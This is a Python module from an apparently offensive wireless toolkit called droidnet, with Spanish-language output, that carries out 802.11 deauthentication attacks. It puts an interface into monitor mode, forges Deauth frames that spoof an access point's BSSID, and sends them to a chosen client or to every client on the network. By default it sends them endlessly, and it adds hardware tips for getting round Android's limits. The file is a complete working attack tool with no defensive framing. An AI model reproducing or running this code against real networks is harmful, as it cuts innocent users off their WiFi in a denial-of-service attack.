"""
802.11 Deauthentication Module.

Sends forged Deauth frames (type 0xC0) to a specific client or to all
clients on an AP (broadcast), forcing WiFi disconnection.

Android limitation:
    Most integrated Android WiFi chips do NOT support monitor mode or
    packet injection. Recommended alternatives:
        · Alfa AWUS036ACH via OTG
        · Run from Raspberry Pi or Kali PC
        · ESP8266 with Deauther firmware (standalone)

WPA3 note:
    WPA3 implements Management Frame Protection (MFP/802.11w). This
    attack does NOT work against WPA3 networks with MFP active.

Requires:
    pip install scapy
"""

import subprocess
import sys
import time

from rich import print as rprint

from droidnet.platform.utils import check_root

# Scapy may be unavailable on Android — handle gracefully at import time
try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
    _SCAPY_OK = True
except ImportError:
    _SCAPY_OK = False

BROADCAST = "ff:ff:ff:ff:ff:ff"


def _check_monitor_mode(iface: str) -> bool:
    """
    Return True if *iface* is in monitor mode.

    Reads /sys/class/net/<iface>/type (803 = IEEE 802.11 monitor).
    More reliable than parsing iwconfig text output.
    """
    try:
        with open(f"/sys/class/net/{iface}/type") as fh:
            return fh.read().strip() == "803"
    except Exception:
        return False


def _enable_monitor(iface: str) -> bool:
    """
    Attempt to put *iface* into monitor mode using ip + iw.

    Returns True if successful, False if the chip does not support it.
    """
    rprint(f"[yellow][!][/yellow] Intentando activar monitor mode en {iface}...")
    subprocess.run(["ip", "link", "set", iface, "down"],            capture_output=True)
    subprocess.run(["iw", "dev", iface, "set", "type", "monitor"],  capture_output=True)
    subprocess.run(["ip", "link", "set", iface, "up"],              capture_output=True)
    time.sleep(1)
    return _check_monitor_mode(iface)


def _disable_monitor(iface: str) -> None:
    """Restore *iface* to managed mode. Best-effort, swallows errors."""
    rprint(f"[dim][·] Restaurando {iface} a modo managed...[/dim]")
    subprocess.run(["ip", "link", "set", iface, "down"],            capture_output=True)
    subprocess.run(["iw", "dev", iface, "set", "type", "managed"],  capture_output=True)
    subprocess.run(["ip", "link", "set", iface, "up"],              capture_output=True)


def _build_deauth(target_mac: str, bssid: str, reason: int = 7):
    """
    Build the 802.11 Deauth Scapy frame.

    Frame structure:
        RadioTap / Dot11(addr1=target, addr2=bssid, addr3=bssid) / Dot11Deauth(reason)

    reason=7 ("Class 3 frame from unassociated STA") is the most
    common code used by legitimate APs and audit tools.
    """
    return (
        RadioTap() /
        Dot11(addr1=target_mac, addr2=bssid, addr3=bssid) /
        Dot11Deauth(reason=reason)
    )


def deauth_target(
    target_mac: str,
    bssid: str,
    iface: str,
    count: int = 0,
    interval: float = 0.1,
) -> None:
    """
    Orchestrate the full deauthentication attack.

    Args:
        target_mac : Client MAC to disconnect, or BROADCAST for all clients.
        bssid      : AP BSSID (used as the spoofed frame source).
        iface      : Interface in monitor mode (e.g. wlan0mon).
        count      : Frames to send; 0 = infinite until Ctrl+C.
        interval   : Seconds between frames (default 0.1 s = 10 fps).
    """
    if not _SCAPY_OK:
        rprint("[red][✗] Scapy no instalado. pip install scapy[/red]")
        return

    if not check_root():
        rprint("[red][✗] Necesitas root.[/red]")
        return

    we_enabled_monitor = False
    if not _check_monitor_mode(iface):
        rprint(f"[yellow][!][/yellow] {iface} no está en monitor mode.")
        if not _enable_monitor(iface):
            rprint(f"[bold red][✗] No se pudo activar monitor mode en {iface}.[/bold red]")
            rprint("[dim]En Android: tu chip WiFi probablemente no soporta esto.\n"
                   "Solución: Alfa AWUS036ACH por OTG, o corre desde una RPi/Kali.[/dim]")
            return
        we_enabled_monitor = True

    frame          = _build_deauth(target_mac, bssid)
    target_display = "BROADCAST (todos)" if target_mac == BROADCAST else target_mac

    rprint(f"\n[bold red][☠][/bold red] Deauth iniciado")
    rprint(f"  Objetivo  : [cyan]{target_display}[/cyan]")
    rprint(f"  AP (BSSID): [cyan]{bssid}[/cyan]")
    rprint(f"  Interfaz  : [cyan]{iface}[/cyan]")
    rprint(f"  Ctrl+C para detener.\n")

    sent = 0
    try:
        while count == 0 or sent < count:
            sendp(frame, iface=iface, verbose=False, inter=interval)
            sent += 1
            rprint(f"  [dim][→] Frames enviados: {sent}[/dim]", end="\r")
    except KeyboardInterrupt:
        rprint(f"\n[bold yellow][!][/bold yellow] Detenido. {sent} frames en total.")
    finally:
        if we_enabled_monitor:
            _disable_monitor(iface)


if __name__ == "__main__":
    if len(sys.argv) < 4:
        rprint("[yellow]Uso: python -m droidnet.modules.deauther <MAC|broadcast> <BSSID> <IFACE>[/yellow]")
        sys.exit(1)

    _target = BROADCAST if sys.argv[1].lower() == "broadcast" else sys.argv[1]
    deauth_target(_target, sys.argv[2], sys.argv[3])
